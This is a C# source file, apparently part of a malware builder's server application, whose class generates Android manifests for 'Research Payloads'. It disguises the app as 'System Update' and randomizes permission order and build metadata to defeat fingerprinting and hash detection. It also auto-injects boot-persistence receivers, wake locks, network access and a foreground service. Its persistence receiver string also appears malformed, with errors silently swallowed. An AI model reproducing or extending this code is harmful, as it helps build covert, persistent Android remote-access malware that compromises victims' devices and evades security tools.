using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Xml.Linq;

namespace TcpServerApp.Services.Elite
{
    /// <summary>
    /// Generates clean AndroidManifest.xml files for Research Payloads.
    /// Supports dynamic permission injection and component registration using robust XML DOM.
    /// </summary>
    public class EliteManifestBuilder
    {
        public string GenerateManifest(string packageName, string serviceName, List<string> permissions, bool useJobService, Dictionary<string, string> receivers = null, List<string> extraActivities = null, bool debuggable = false)
        {
            XNamespace androidNs = "http://schemas.android.com/apk/res/android";

            var manifest = new XElement("manifest",
                new XAttribute(XNamespace.Xmlns + "android", androidNs),
                new XAttribute("package", packageName));

            // 1. Permissions (Randomized Order for Anti-Fingerprinting)
            // 1. Permissions (Randomized Order for Anti-Fingerprinting)
            var finalPermissions = new List<string>(permissions ?? new List<string>());
            
            // Auto-Inject Critical Permissions for Research Stablity
            finalPermissions.Add("android.permission.RECEIVE_BOOT_COMPLETED");
            finalPermissions.Add("android.permission.FOREGROUND_SERVICE");
            finalPermissions.Add("android.permission.WAKE_LOCK"); // Keep CPU running
            finalPermissions.Add("android.permission.INTERNET");  // Required for socket
            finalPermissions.Add("android.permission.ACCESS_NETWORK_STATE");

            var rnd = new Random();
            var randomizedPerms = finalPermissions.Distinct().OrderBy(x => rnd.Next()).ToList();
            
            foreach (var perm in randomizedPerms)
            {
                manifest.Add(new XElement("uses-permission", 
                    new XAttribute(androidNs + "name", perm)));
            }

            // 2. Queries (Android 11+ Visibility)
            var queries = new XElement("queries");
            queries.Add(new XElement("intent",
                new XElement("action", new XAttribute(androidNs + "name", "android.intent.action.MAIN"))));
            queries.Add(new XElement("package", new XAttribute(androidNs + "name", "com.android.vending"))); // Play Store visibility
            manifest.Add(queries);

            // 3. Application
            var app = new XElement("application",
                new XAttribute(androidNs + "label", "System Update"),
                new XAttribute(androidNs + "debuggable", debuggable.ToString().ToLower()));

            // Random Meta-Data for Hash Variation
            string uniqueBuildId = Guid.NewGuid().ToString();
            app.Add(new XElement("meta-data",
                new XAttribute(androidNs + "name", "com.android.vending.build_id"),
                new XAttribute(androidNs + "value", uniqueBuildId)));

            // A. Main Activity (The Face)
            var mainAct = new XElement("activity",
                new XAttribute(androidNs + "name", ".MainActivity"),
                new XAttribute(androidNs + "exported", "true"),
                new XElement("intent-filter",
                    new XElement("action", new XAttribute(androidNs + "name", "android.intent.action.MAIN")),
                    new XElement("category", new XAttribute(androidNs + "name", "android.intent.category.LAUNCHER"))
                ));
            app.Add(mainAct);

            // Extra Activities
            if (extraActivities != null)
            {
                foreach (var actXml in extraActivities)
                {
                    try 
                    { 
                        // Parse raw XML string to XElement to ensure validity before adding
                        app.Add(XElement.Parse(actXml)); 
                    } 
                    catch { /* Log malformed XML? */ }
                }
            }
            
            // Service Definition (Hardened for Android 14+)
            var service = new XElement("service",
                new XAttribute(androidNs + "name", $".{serviceName}"),
                new XAttribute(androidNs + "enabled", "true"),
                new XAttribute(androidNs + "foregroundServiceType", "specialUse"));
            
            // Android 14+ Property for Special Use
            service.Add(new XElement("property",
                new XAttribute(androidNs + "name", "android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"),
                new XAttribute(androidNs + "value", "Research Synchronization Node")));
            
            if (useJobService)
            {
                service.Add(new XAttribute(androidNs + "permission", "android.permission.BIND_JOB_SERVICE"));
                service.Add(new XAttribute(androidNs + "exported", "true"));
            }
            app.Add(service);

            // Receivers
            // Receivers
            if (receivers == null) receivers = new Dictionary<string, string>();
            
            // Auto-Inject Persistence Receiver
            string bootReceiverXml = $@"<receiver android:name="".BootReceiver"" android:enabled=""true"" android:exported=""true"">
                <intent-filter>
                    <action android:name=""android.intent.action.BOOT_COMPLETED"" />
                    <action android:name=""android.intent.action.QUICKBOOT_POWERON"" />
                </intent-filter>
            </receiver>";
            
            if (!receivers.ContainsKey("BootReceiver")) receivers.Add("BootReceiver", bootReceiverXml);

            foreach (var recvXml in receivers.Values)
            {
                try { app.Add(XElement.Parse(recvXml)); } catch { }
            }

            manifest.Add(app);

            var doc = new XDocument(new XDeclaration("1.0", "utf-8", null), manifest);
            return doc.Declaration + Environment.NewLine + doc.ToString();
        }
    }
}
